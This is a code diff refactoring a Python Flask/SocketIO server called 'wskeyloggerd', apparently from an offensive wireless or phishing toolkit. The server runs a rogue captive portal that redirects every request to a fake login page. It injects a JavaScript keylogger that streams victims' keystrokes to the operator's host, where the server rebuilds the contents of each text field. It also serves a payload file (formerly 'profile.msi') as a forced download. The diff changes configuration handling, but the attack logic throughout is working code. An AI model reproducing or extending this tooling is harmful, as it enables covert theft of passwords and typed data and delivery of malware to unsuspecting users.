@@ -21,41 +21,100 @@ from datetime import datetime
 from urllib.parse import urlencode
 from urllib.parse import quote_plus
 
-logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)
+from settings import settings
 
-event_logger = loggers.EventLogger()
-user_logger = loggers.UserLogger()
+'''
+      .    .
+          .       =O===
+       . _       %- - %%%
+        (_)     % <    D%%
+         |      ' ,  ,$$$
+        -/-     %%%%  |
+         |//; ,---' _ |----.
+          \ )(           /  )
+          | \/ \.   '  _.|,  \
+          |  \ /(   /    / \_ \
+           \ /  (        | /  )
+                (  ,  ___|/ ,`
+                (   _/ (  |  \_
+              _/\--//     ,\\\
+    _______ _/\\   / |      |_________
+   |_______/   \\ / _/   ,   |________|
+   __|___#/     \  _  '      |##____|___
+  /______/ _    |  / \   |   /__________\
+        |   /           _/\_/  b'ger
+        /_     '_,____\/ )(
+       |/ \_   /        (  \
+        | /-\_/          Oooo
+        )(.
+       /  )
+      oooO
+'''
+
+# obtain settings -------------------------------------------------------------
+
+pathsd          = settings.dict['paths']['wskeyloggerd']
+local_settings  = settings.dict['core']['wskeyloggerd']
+
+routes    = local_settings['routes']
+filenames = local_settings['filenames']
+kl_cnf    = local_settings['keylogger']
+gen_cnf   = local_settings['general']
+
+# create loggers --------------------------------------------------------------
+
+logging.basicConfig(filename=filenames['main_log'], level=logging.INFO)
+
+event_logger     = loggers.EventLogger()
+user_logger      = loggers.UserLogger()
 keystroke_logger = loggers.KeystrokeLogger()
 
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret'
-socketio = SocketIO(app)
-hosts = {}
-configs = None
+# create server ---------------------------------------------------------------
 
-portal_route = '/login'
-eh_template_dir = 'dont_touch'
-login_template = 'login.html'
+app                         = Flask(__name__)
+app.config['SECRET_KEY']    = gen_cnf['secret_key']
+socketio                    = SocketIO(app)
+hosts                       = {}
+configs                     = None
 
-keylogger_script_route = '/wks'
-keylogger_script_template = os.path.join(eh_template_dir, 'wsk.min.js')
+# set routes ------------------------------------------------------------------
 
-socketio_script_route = '/sio'
-socketio_script_template = os.path.join(eh_template_dir, 'socket.io.min.js')
+portal_route            = routes['portal_route']
+keylogger_script_route  = routes['keylogger_script_route']
+socketio_script_route   = routes['socketio_script_route']
 
-ws_namespace = '/test'
-redir_param = 'orig_url'
+# set dirs --------------------------------------------------------------------
 
-msg_details_param = 'jskdetails'
-send_details_event = 'send_details'
+eh_template_dir = gen_cnf['parent_template_dir']
 
-keydown_event = 'keydown'
-connect_event = 'connect'
-disconnect_event = 'disconnect'
+# set filenames ---------------------------------------------------------------
 
-connect_event_response_msg = 'confirm connection'
+login_template = filenames['login_template']
 
-form_name = 'static/payloads/profile.msi'
+keylogger_script_template = os.path.join(eh_template_dir,
+                                         filenames['keylogger_script'])
+
+socketio_script_template  = os.path.join(eh_template_dir,
+                                         filenames['socketio_script'])
+
+# set general configs ---------------------------------------------------------
+
+redir_param = gen_cnf['redir_param']
+
+# set keylogger configs -------------------------------------------------------
+
+ws_namespace        = kl_cnf['namespace']
+
+msg_details_param   = kl_cnf['msg_details_param']
+
+send_details_event  = kl_cnf['send_details_event']
+keydown_event       = kl_cnf['keydown_event']
+connect_event       = kl_cnf['connect_event']
+disconnect_event    = kl_cnf['disconnect_event']
+
+connect_event_response_msg = kl_cnf['connect_event_response_msg']
+
+payload_dir = pathsd['payloads']
 
 # utils -----------------------------------------------------------------------
 
@@ -65,6 +124,7 @@ def plog(message):
     event_logger.log(message)
 
 def gen_view_state():
+
     return ''.join(random.choice(string.printable) for x in range(32)).encode()
 
 def build_redirect_url(req_url):
@@ -72,9 +132,9 @@ def build_redirect_url(req_url):
     query_params = { redir_param : req_url }
 
     options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
-    proto = 'https' if options['portal_https'] else 'http'
+    lhost   = options['lhost']
+    lport   = options['lport']
+    proto   = 'https' if options['portal_https'] else 'http'
 
     url_base = "{}://{}:{}{}?".format(proto, lhost, lport, portal_route)
 
@@ -90,8 +150,10 @@ def build_redirect_url(req_url):
 def serve():
 
     options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
+    lhost   = options['lhost']
+    lport   = options['lport']
+
+    payload_path = os.path.join(payload_dir, options['payload'])
 
     if 'view_state' not in request.cookies:
 
@@ -110,14 +172,16 @@ def serve():
                                 page_view='serve',
                                 file_download='True',
                                 method='GET')
-    return send_file(form_name, as_attachment=True)
+
+    return send_file(payload_path, as_attachment=True)
+
 
 @app.route(portal_route, methods=['GET', 'POST'])
 def login():
     
-    options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
+    options       = app.config['options']
+    lhost         = options['lhost']
+    lport         = options['lport']
     user_template = options['portal_user_template']
 
     print('[*] user_template is', user_template)
@@ -247,8 +311,8 @@ def login():
 @app.route('/<path:path>')
 def catch_all(path):
     options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
+    lhost   = options['lhost']
+    lport   = options['lport']
 
     redirect_url = build_redirect_url(request.url)
     plog('[*] Login(): Redirecting to: {}'.format(redirect_url))
@@ -262,12 +326,12 @@ def catch_all(path):
 def load_socketio():
 
     options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
+    lhost   = options['lhost']
+    lport   = options['lport']
 
-    jsfile = render_template(socketio_script_template,
-                             lhost=lhost,
-                             lport=lport)
+    jsfile  = render_template(socketio_script_template,
+                              lhost=lhost,
+                              lport=lport)
 
     response = make_response(jsfile)
     response.headers['Content-Type'] = 'application/javascript'
@@ -278,12 +342,12 @@ def load_socketio():
 def load_keylogger_script():
 
     options = app.config['options']
-    lhost = options['portal_lhost']
-    lport = options['portal_lport']
+    lhost   = options['lhost']
+    lport   = options['lport']
 
-    jsfile = render_template(keylogger_script_template,
-                             lhost=lhost,
-                             lport=lport)
+    jsfile  = render_template(keylogger_script_template,
+                              lhost=lhost,
+                              lport=lport)
 
     response = make_response(jsfile)
 
@@ -336,19 +400,19 @@ def keydown(message):
     host = message['page_details']['url']['host']
     
     clients = hosts[host]
-    client = clients[ip]
+    client  = clients[ip]
 
     text_field = message['data']['tag_details']
     _id = text_field['_id']
-    contents = client[_id]['contents']
+    contents   = client[_id]['contents']
         
-    keystroke = message['data']['ks']
-    ctrl_pressed = message['data']['ctrl']
-    alt_pressed = message['data']['alt']
-    shift_pressed = message['data']['shift']
+    keystroke       = message['data']['ks']
+    ctrl_pressed    = message['data']['ctrl']
+    alt_pressed     = message['data']['alt']
+    shift_pressed   = message['data']['shift']
     selection_start = message['data']['start_pos']
-    selection_end = message['data']['end_pos']
-    view_state = message['data']['view_state']
+    selection_end   = message['data']['end_pos']
+    view_state      = message['data']['view_state']
 
     if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
         return
@@ -368,6 +432,7 @@ def keydown(message):
             contents.pop(selection_start)
         else:
             del contents[selection_start:selection_end]
+
     else:
         
         if shift_pressed:
@@ -404,29 +469,28 @@ def keydown(message):
 
 # driver function -------------------------------------------------------------
 
-def run(settings, options):
+def run(options):
 
-
-    app.config['options'] = options
-    app.config['settings'] = settings
+    app.config['options']      = options
+    app.config['settings']     = settings
     app.config['USE_RELOADER'] = False
     app.config['use_reloader'] = False
+
     if options['debug'] or options['portal_debug']:
+
         app.config['DEBUG'] = True
 
 
-    print(1)
     if options['portal_https']:
 
-        print(2)
-
         socketio.run(app,
-                     host=options['portal_lhost'],
-                     port=options['portal_lport'],
+                     host=options['lhost'],
+                     port=options['lport'],
                      certfile=options['portal_cert'], 
                      keyfile=options['portal_private_key'])
     else:
 
-        print(3)
-        #socketio.run(app, host=options['portal_lhost'], port=options['portal_lport'], use_reloader=False)
-        socketio.run(app, host=options['portal_lhost'], port=80, use_reloader=False)
+        socketio.run(app,
+                     host=options['lhost'],
+                     port=options['lport'],
+                     use_reloader=False)
